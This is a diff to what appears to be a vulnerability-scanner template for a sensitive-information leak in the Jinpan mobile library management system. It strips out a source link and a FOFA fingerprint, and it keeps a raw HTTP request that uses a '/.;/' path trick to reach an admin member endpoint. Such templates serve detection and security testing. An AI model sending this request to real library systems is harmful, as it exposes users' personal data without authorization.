@@ -3,12 +3,8 @@ info:
   name: 金盘移动图书馆图书管理系统 tabShow 敏感信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lvgfwc6i8ug2zdng'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lvgfwc6i8ug2zdng
-    fofa: icon_hash="89337953"
 http:
 - raw:
   - GET /.;/admin/auth/member/1/tabShow HTTP/1.1
